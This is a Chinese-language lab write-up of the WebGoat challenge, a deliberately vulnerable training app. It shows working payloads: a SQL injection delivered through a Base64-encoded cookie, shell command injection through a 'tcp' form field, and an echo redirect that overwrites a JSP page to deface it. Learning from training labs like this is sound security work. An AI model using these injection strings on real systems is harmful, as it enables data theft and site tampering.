<input name="user" type="HIDDEN" value="youaretheweakestlink">

```

可以看到它的字段是name,难道是管理员帐号?所以使用这个登录一下,然后同时进行注入攻击,发现还是他娘的进不去....

到这里我就跪了,万念俱灰...只要去打开youtube(你土鳖)看看答案

当我知道答案的时候...恨不得把作者打一顿....分明是在开挂!

**首先总结一下,youaretheweakestlink作为用户名是猜对了,可是密码在哪呢?**只看到答案打开了一个链接

```
local:8080/WebGoat/source?source=true

```

把WebGoat后的都删掉,然后加上source,还要给source赋值为true....这个source尼玛哪里出现的啊...如果不赋值为true还不能看到源代码,在源代码的121行

```
121      private String pass = "goodbye";
122  
123      private String user = "youaretheweakestlink";

```

可以看到密码"goodbye"...尝试登录发现进去了

### Stage2

第二步是让取出所有信用卡信息,这种根据以往的练习,肯定都是使用SQL注入让某个SELECT语句取出所有信息,根据BurpSuite的拦截信息或者Network来看的话,**进入第二个页面之后,并没有任何请求出现**,所以说注入点肯定还在登录的时候

依次对Username/Password/Submit/user/user(Cookie)这几个注入点进行检查,发现user(Cookie)进行注入就可以获得到所有信用卡信息,但是注意使用的是Base64编码后的信息

```
youaretheweakestlink' OR '1'='1
//编码后注入代码为
eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ==

```

### Stage3

第三步发现是各种网络协议的表单,根据经验判断(就是猜)这种表单一般有两种获取形式

1.  利用SQL从数据库读取
2.  利用cmd命令行得到

先尝试拦截报文,对file字段做SQL注入,发现没有效果.然后进行命令行注入,通用命令"ls"

```
tcp && ls

```

这里注意坑爹的事情

由于是为了出题而出题,只有tcp具有命令行注入功能,选其它的选项卡都不行,是因为Java在源代码里做判断,只在tcp时让其**故意**有注入漏洞.[Youtube上视频是5.2版本](https://www.youtube.com/watch?v=kvX7ORKmPBc)的...使用的是ip进行的注入,耽搁了老子好久...

还有一点需要注意,Youtube上给出的注入命令是

```
&& pwd && ls && find -name "webgoat_challenge_guest.jsp"

```

这些指令在Mac下是无效的,Mac下需要的指令主要是find不一样

```
tcp; pwd; ls; find . -iname "webgoat_challenge_guest.jsp";

```

通过命名行注入,我们可以得到webgoat_challenge_guest.jsp文件的地址

![Figure03](http://drops.javaweb.org/uploads/images/70c576500ddf7dc458d7a4c999ee7e8f32d560e5.jpg)

然后可以使用另外一段自定义的HTML文本代替webgoat_challenge_guest.jsp,原理是利用了命令行注入的

```
echo "text" > file

```

意思是使用清空file的内容文本,填充"text"进入file,对应的另外一个

```
echo "text" >> file 

```

保留file的内容文本,后续补充"text",[百度原理看这里](http://jingyan.baidu.com/article/a501d80c0c9cbaec630f5e8d.html),构造注入语句

```
tcp; echo "<html><body>Mission Complete</body></html>" > WebGoat/webgoat-container/target/webgoat-container-7.1-SNAPSHOT/webgoat_challenge_guest.jsp

```

### Stage4

任务完成了,WebGoat的练习题只能说坑爹坑爹十分坑爹...但是总体来说还是熟悉了常用的攻击手段...学到了不少东西